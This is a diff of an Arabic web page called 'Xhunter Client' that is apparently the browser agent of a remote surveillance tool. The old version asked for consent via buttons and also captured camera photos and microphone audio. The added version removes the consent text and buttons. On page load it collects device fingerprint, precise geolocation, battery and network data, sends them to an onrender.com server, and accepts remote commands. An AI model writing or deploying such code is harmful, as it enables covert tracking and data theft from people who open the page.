@@ -1,173 +1,457 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>عميل Xhunter (موافق)</title>
-<style>
-body{font-family:Arial,helvetica,sans-serif;background:#071021;color:#bfffe8;padding:18px}
-h1{color:#00ffcc}
-button{padding:10px 12px;margin:6px;border-radius:7px;border:none;background:#00ffcc;color:#001219;font-weight:700;cursor:pointer}
-.small{padding:8px 10px;font-size:13px}
-.info{margin:8px 0;color:#dfffe8}
-</style>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Xhunter Client</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0d1b2a, #1b263b);
+            color: #e0e1dd;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+            direction: rtl;
+        }
+        
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            background: rgba(27, 38, 59, 0.8);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(119, 141, 169, 0.5);
+            border: 1px solid rgba(119, 141, 169, 0.3);
+        }
+        
+        h1 {
+            color: #778da9;
+            margin-bottom: 30px;
+            text-shadow: 0 0 10px rgba(119, 141, 169, 0.7);
+        }
+        
+        .status {
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(13, 27, 42, 0.7);
+            border-radius: 8px;
+            border-left: 4px solid #778da9;
+        }
+        
+        .progress {
+            height: 10px;
+            background: rgba(119, 141, 169, 0.2);
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: #778da9;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        .info {
+            text-align: right;
+            margin: 15px 0;
+            padding: 10px;
+            background: rgba(13, 27, 42, 0.5);
+            border-radius: 5px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .success { border-left-color: #4caf50; }
+        .error { border-left-color: #f44336; }
+        .warning { border-left-color: #ff9800; }
+    </style>
 </head>
 <body>
-<h1>عميل Xhunter</h1>
-<p class="info">هذه الصفحة ستطلب أذوناتك لصالح التجريب: الموقع، الكاميرا، الميكروفون، والمزيد. لا يعمل شيء بدون موافقتك الصريحة.</p>
+    <div class="container">
+        <h1>عميل Xhunter</h1>
+        
+        <div id="initialStatus" class="status">
+            <i class="fas fa-spinner fa-spin"></i>
+            جاري تهيئة العميل وتحميل البيانات...
+        </div>
+        
+        <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div id="connectionStatus" class="status hidden">
+            <i class="fas fa-plug"></i>
+            حالة الاتصال: <span id="connectionText">جاري الاتصال بالخادم...</span>
+        </div>
+        
+        <div id="dataStatus" class="status hidden">
+            <i class="fas fa-database"></i>
+            حالة البيانات: <span id="dataText">جمع المعلومات...</span>
+        </div>
+        
+        <div id="results" class="hidden">
+            <h2>البيانات التي تم إرسالها</h2>
+            <div class="info" id="deviceInfo">معلومات الجهاز: جاري التحميل...</div>
+            <div class="info" id="locationInfo">الموقع: جاري التحميل...</div>
+            <div class="info" id="networkInfo">معلومات الشبكة: جاري التحميل...</div>
+            <div class="info" id="batteryInfo">حالة البطارية: جاري التحميل...</div>
+        </div>
+        
+        <div id="errorMessage" class="status error hidden">
+            <i class="fas fa-exclamation-circle"></i>
+            <span id="errorText"></span>
+        </div>
+    </div>
 
-<button id="btnSendDeviceInfo">إرسال معلومات الجهاز الأساسية</button>
-<button id="btnGetBattery" class="small">فحص البطارية</button>
-<button id="btnGetNetwork" class="small">فحص الشبكة</button>
-<button id="btnGetLocation" class="small">إرسال الموقع الآن</button>
-<button id="btnCamera" class="small">التقاط صورة بالكاميرا</button>
-<button id="btnMic" class="small">تسجيل صوت (3 ثواني)</button>
+    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
+    <script>
+        // عناصر DOM
+        const initialStatus = document.getElementById('initialStatus');
+        const connectionStatus = document.getElementById('connectionStatus');
+        const connectionText = document.getElementById('connectionText');
+        const dataStatus = document.getElementById('dataStatus');
+        const dataText = document.getElementById('dataText');
+        const progressBar = document.getElementById('progressBar');
+        const results = document.getElementById('results');
+        const deviceInfo = document.getElementById('deviceInfo');
+        const locationInfo = document.getElementById('locationInfo');
+        const networkInfo = document.getElementById('networkInfo');
+        const batteryInfo = document.getElementById('batteryInfo');
+        const errorMessage = document.getElementById('errorMessage');
+        const errorText = document.getElementById('errorText');
 
-<script src="/socket.io/socket.io.js"></script>
-<script>
-const socket = io('https://xhunter-bsos.onrender.com', { transports:['websocket'], reconnection:true });
-// replace URL above with your render URL
+        // بيانات التطبيق
+        let socket = null;
+        let deviceId = null;
+        let collectedData = {};
+        let isConnected = false;
 
-const deviceId = 'device_' + Math.floor(Math.random()*10000);
-const model = navigator.userAgent;
-let ip = null;
+        // إنشاء معرف فريد للجهاز
+        function generateDeviceId() {
+            const timestamp = Date.now().toString(36);
+            const randomStr = Math.random().toString(36).substring(2, 8);
+            return `device_${timestamp}_${randomStr}`;
+        }
 
-// get public IP (optional)
-fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(j=>{ ip = j.ip; }).catch(()=>ip=null);
+        // تحديث شريط التقدم
+        function updateProgress(percent) {
+            progressBar.style.width = percent + '%';
+        }
 
-// helper to emit safely
-function emit(ev, payload){ socket.emit(ev, payload); console.log('emit', ev, payload); }
+        // إظهار رسالة الخطأ
+        function showError(message) {
+            errorText.textContent = message;
+            errorMessage.classList.remove('hidden');
+        }
 
-// send base device info
-document.getElementById('btnSendDeviceInfo').addEventListener('click', ()=>{
-  const payload = {
-    id: deviceId,
-    model: model,
-    language: navigator.language,
-    screen: { width: window.screen.width, height: window.screen.height },
-    platform: navigator.platform,
-    cookiesEnabled: navigator.cookieEnabled,
-    deviceMemory: navigator.deviceMemory || null,
-    hardwareConcurrency: navigator.hardwareConcurrency || null,
-    ip
-  };
-  emit('join', payload); // also used by server to register
-  emit('deviceInfo', { id: deviceId, extra: payload });
-  alert('تم إرسال معلومات الجهاز الأساسية.');
-});
+        // جمع معلومات الجهاز
+        function collectDeviceInfo() {
+            dataText.textContent = 'جمع معلومات الجهاز...';
+            updateProgress(20);
+            
+            const deviceInfoData = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookieEnabled: navigator.cookieEnabled,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                window: {
+                    width: window.innerWidth,
+                    height: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                date: new Date().toLocaleString('ar-SA')
+            };
+            
+            collectedData.deviceInfo = deviceInfoData;
+            deviceInfo.textContent = `معلومات الجهاز: ${navigator.platform} - ${navigator.userAgent.substring(0, 50)}...`;
+            
+            return deviceInfoData;
+        }
 
-// battery
-document.getElementById('btnGetBattery').addEventListener('click', async ()=>{
-  if(navigator.getBattery){
-    try{
-      const batt = await navigator.getBattery();
-      const b = { level: batt.level, charging: batt.charging, chargingTime: batt.chargingTime, dischargingTime: batt.dischargingTime };
-      emit('battery', { id: deviceId, data: b });
-      alert('تم إرسال حالة البطارية.');
-    }catch(e){ alert('خطأ في الحصول على البطارية: '+e.message); }
-  } else alert('الـ Battery API غير مدعوم في متصفحك.');
-});
+        // جمع معلومات البطارية
+        async function collectBatteryInfo() {
+            dataText.textContent = 'جمع معلومات البطارية...';
+            updateProgress(40);
+            
+            let batteryData = { supported: false };
+            
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryData = {
+                        supported: true,
+                        level: battery.level,
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                    
+                    batteryInfo.textContent = `حالة البطارية: ${battery.charging ? 'شحن' : 'غير مشحون'} - ${Math.round(battery.level * 100)}%`;
+                } catch (error) {
+                    batteryData.error = error.message;
+                    batteryInfo.textContent = 'حالة البطارية: غير متاحة';
+                }
+            } else {
+                batteryInfo.textContent = 'حالة البطارية: غير مدعومة في هذا المتصفح';
+            }
+            
+            collectedData.battery = batteryData;
+            return batteryData;
+        }
 
-// network info
-document.getElementById('btnGetNetwork').addEventListener('click', ()=>{
-  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if(conn){
-    const n = { effectiveType: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt, saveData: conn.saveData };
-    emit('networkInfo', { id: deviceId, data: n });
-    alert('تم إرسال بيانات الشبكة.');
-  } else alert('network information غير متاحة في هذا المتصفح.');
-});
+        // جمع معلومات الموقع
+        function collectLocationInfo() {
+            dataText.textContent = 'جمع معلومات الموقع...';
+            updateProgress(60);
+            
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    locationInfo.textContent = 'الموقع: غير مدعوم في هذا المتصفح';
+                    resolve({ supported: false });
+                    return;
+                }
+                
+                const locationOptions = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                };
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const locationData = {
+                            supported: true,
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            timestamp: position.timestamp
+                        };
+                        
+                        collectedData.location = locationData;
+                        locationInfo.textContent = `الموقع: ${position.coords.latitude.toFixed(4)}, ${position.coords.longitude.toFixed(4)} (دقة: ${Math.round(position.coords.accuracy)}m)`;
+                        resolve(locationData);
+                    },
+                    (error) => {
+                        const locationData = {
+                            supported: true,
+                            error: error.message,
+                            errorCode: error.code
+                        };
+                        
+                        collectedData.location = locationData;
+                        locationInfo.textContent = `الموقع: خطأ - ${error.message}`;
+                        resolve(locationData);
+                    },
+                    locationOptions
+                );
+            });
+        }
 
-// location (with high accuracy option)
-document.getElementById('btnGetLocation').addEventListener('click', ()=>{
-  if(!navigator.geolocation){ alert('جيولوجي غير متاح'); return; }
-  navigator.geolocation.getCurrentPosition(pos=>{
-    emit('getLocation', { id: deviceId, data: { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy } });
-    alert('تم إرسال الموقع.');
-  }, err => {
-    alert('فشل الحصول على الموقع: ' + err.message);
-  }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
-});
+        // جمع معلومات الشبكة
+        function collectNetworkInfo() {
+            dataText.textContent = 'جمع معلومات الشبكة...';
+            updateProgress(80);
+            
+            let networkData = { supported: false };
+            
+            if ('connection' in navigator) {
+                const connection = navigator.connection;
+                networkData = {
+                    supported: true,
+                    downlink: connection.downlink,
+                    effectiveType: connection.effectiveType,
+                    rtt: connection.rtt,
+                    saveData: connection.saveData,
+                    type: connection.type
+                };
+                
+                networkInfo.textContent = `معلومات الشبكة: ${connection.effectiveType} - ${connection.downlink}Mb/s`;
+            } else if ('mozConnection' in navigator) {
+                const connection = navigator.mozConnection;
+                networkData = {
+                    supported: true,
+                    bandwidth: connection.bandwidth,
+                    metered: connection.metered
+                };
+                
+                networkInfo.textContent = `معلومات الشبكة: Firefox - ${connection.bandwidth}Mb/s`;
+            } else {
+                networkInfo.textContent = 'معلومات الشبكة: غير مدعومة في هذا المتصفح';
+            }
+            
+            // إضافة عنوان IP (سيتم الحصول عليه من الخادم)
+            collectedData.network = networkData;
+            return networkData;
+        }
 
-// camera: capture a photo and send as base64
-document.getElementById('btnCamera').addEventListener('click', async ()=>{
-  try{
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
-    const video = document.createElement('video');
-    video.autoplay = true; video.playsInline = true;
-    video.srcObject = stream;
-    await new Promise(r => video.onloadedmetadata = r);
-    // capture single frame to canvas
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 1280;
-    canvas.height = video.videoHeight || 720;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
-    // stop stream tracks
-    stream.getTracks().forEach(t => t.stop());
-    emit('photo', { id: deviceId, data: dataUrl });
-    alert('تم التقاط الصورة وإرسالها.');
-  }catch(e){
-    alert('تعذر فتح الكاميرا: ' + e.message);
-  }
-});
+        // الاتصال بالخادم وإرسال البيانات
+        async function connectAndSendData() {
+            try {
+                // إنشاء معرف الجهاز
+                deviceId = generateDeviceId();
+                
+                // جمع البيانات
+                collectDeviceInfo();
+                await collectBatteryInfo();
+                await collectLocationInfo();
+                collectNetworkInfo();
+                
+                // الاتصال بالخادم
+                dataText.textContent = 'جاري الاتصال بالخادم...';
+                updateProgress(90);
+                
+                socket = io('https://xhunter-1-2not.onrender.com', {
+                    transports: ['websocket'],
+                    timeout: 15000
+                });
+                
+                socket.on('connect', () => {
+                    isConnected = true;
+                    connectionText.textContent = 'متصل بالخادم';
+                    connectionStatus.classList.add('success');
+                    
+                    dataText.textContent = 'جاري إرسال البيانات...';
+                    
+                    // إرسال بيانات انضمام الجهاز
+                    socket.emit('join', {
+                        id: deviceId,
+                        name: `جهاز ${deviceId.substring(0, 8)}`,
+                        model: navigator.userAgent,
+                        language: navigator.language,
+                        screen: collectedData.deviceInfo.screen,
+                        platform: navigator.platform,
+                        cookiesEnabled: navigator.cookieEnabled,
+                        ip: 'جاري التحديد...' // سيحددها الخادم
+                    });
+                    
+                    // إرسال معلومات الجهاز
+                    socket.emit('deviceInfo', {
+                        id: deviceId,
+                        extra: collectedData.deviceInfo
+                    });
+                    
+                    // إرسال معلومات البطارية إذا كانت متاحة
+                    if (collectedData.battery.supported) {
+                        socket.emit('battery', {
+                            id: deviceId,
+                            data: collectedData.battery
+                        });
+                    }
+                    
+                    // إرسال معلومات الموقع إذا كانت متاحة
+                    if (collectedData.location && collectedData.location.supported) {
+                        socket.emit('getLocation', {
+                            id: deviceId,
+                            data: {
+                                lat: collectedData.location.latitude,
+                                lng: collectedData.location.longitude,
+                                accuracy: collectedData.location.accuracy
+                            }
+                        });
+                    }
+                    
+                    // إرسال معلومات الشبكة إذا كانت متاحة
+                    if (collectedData.network.supported) {
+                        socket.emit('networkInfo', {
+                            id: deviceId,
+                            data: collectedData.network
+                        });
+                    }
+                    
+                    dataText.textContent = 'تم إرسال جميع البيانات بنجاح';
+                    updateProgress(100);
+                    
+                    // إظهار النتائج
+                    results.classList.remove('hidden');
+                    initialStatus.classList.add('hidden');
+                });
+                
+                socket.on('disconnect', () => {
+                    isConnected = false;
+                    connectionText.textContent = 'انقطع الاتصال بالخادم';
+                    connectionStatus.classList.remove('success');
+                    connectionStatus.classList.add('error');
+                });
+                
+                socket.on('connect_error', (error) => {
+                    console.error('خطأ في الاتصال:', error);
+                    connectionText.textContent = 'فشل في الاتصال بالخادم';
+                    connectionStatus.classList.remove('success');
+                    connectionStatus.classList.add('error');
+                    
+                    showError('تعذر الاتصال بالخادم. يرجى المحاولة لاحقاً.');
+                });
+                
+                // استقبال الأوامر من الخادم
+                socket.on('command', (command) => {
+                    console.log('أمر مستلم من الخادم:', command);
+                    
+                    // معالجة الأوامر المختلفة
+                    switch(command.action) {
+                        case 'getLocation':
+                            collectLocationInfo().then(location => {
+                                if (location.supported && location.latitude) {
+                                    socket.emit('getLocation', {
+                                        id: deviceId,
+                                        data: {
+                                            lat: location.latitude,
+                                            lng: location.longitude,
+                                            accuracy: location.accuracy
+                                        }
+                                    });
+                                }
+                            });
+                            break;
+                            
+                        case 'getInstalledApps':
+                            // لا يمكن الحصول على التطبيقات المثبتة في المتصفح
+                            socket.emit('getInstalledApps', {
+                                id: deviceId,
+                                data: { error: 'غير متاح في متصفح الويب' }
+                            });
+                            break;
+                            
+                        // يمكن إضافة المزيد من الأوامر هنا
+                    }
+                });
+                
+            } catch (error) {
+                console.error('خطأ في جمع أو إرسال البيانات:', error);
+                showError(`حدث خطأ: ${error.message}`);
+            }
+        }
 
-// mic: record short audio clip (3s) and send base64
-document.getElementById('btnMic').addEventListener('click', async ()=>{
-  try{
-    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-    const mediaRecorder = new MediaRecorder(stream);
-    const chunks = [];
-    mediaRecorder.ondataavailable = e => { if(e.data && e.data.size) chunks.push(e.data); };
-    mediaRecorder.onstop = async () => {
-      const blob = new Blob(chunks, { type: 'audio/webm' });
-      // read as base64
-      const reader = new FileReader();
-      reader.onload = () => {
-        const base64 = reader.result; // data:audio/webm;base64,...
-        emit('audio', { id: deviceId, data: base64 });
-        alert('تم تسجيل الصوت وإرساله.');
-      };
-      reader.readAsDataURL(blob);
-      stream.getTracks().forEach(t=>t.stop());
-    };
-    mediaRecorder.start();
-    alert('بدء التسجيل (3 ثواني)...');
-    setTimeout(()=> mediaRecorder.stop(), 3000);
-  }catch(e){
-    alert('تعذر الوصول إلى الميكروفون: ' + e.message);
-  }
-});
-
-// also respond to server requests for getLocation, photo, audio etc
-socket.on('getLocation', () => {
-  if(navigator.geolocation){
-    navigator.geolocation.getCurrentPosition(pos=>{
-      emit('getLocation', { id: deviceId, data: { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy } });
-    }, err => {
-      emit('getLocation', { id: deviceId, data: { lat: 0, lon:0, accuracy: null } });
-    }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
-  } else {
-    emit('getLocation', { id: deviceId, data: { lat:0, lon:0 } });
-  }
-});
-
-// handle other commands generically (server can send getInstalledApps etc — browser will reply with 'not available' text)
-const allowed = ['getInstalledApps','getContacts','getCallLog','getSMS','downloadWhatsappDatabase','getExtraData'];
-allowed.forEach(a=>{
-  socket.on(a, () => {
-    const reply = (a === 'getExtraData') ? {
-      deviceMemory: navigator.deviceMemory || null,
-      platform: navigator.platform,
-      language: navigator.language,
-      userAgent: navigator.userAgent,
-      storageEstimate: (navigator.storage && navigator.storage.estimate) ? 'available' : null
-    } : 'غير متاح من المتصفح';
-    emit(a, { id: deviceId, data: reply });
-  });
-});
-
-</script>
+        // بدء العملية عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            // إظهار عناصر الواجهة
+            connectionStatus.classList.remove('hidden');
+            dataStatus.classList.remove('hidden');
+            
+            // بدء جمع وإرسال البيانات
+            connectAndSendData();
+        });
+    </script>
 </body>
 </html>
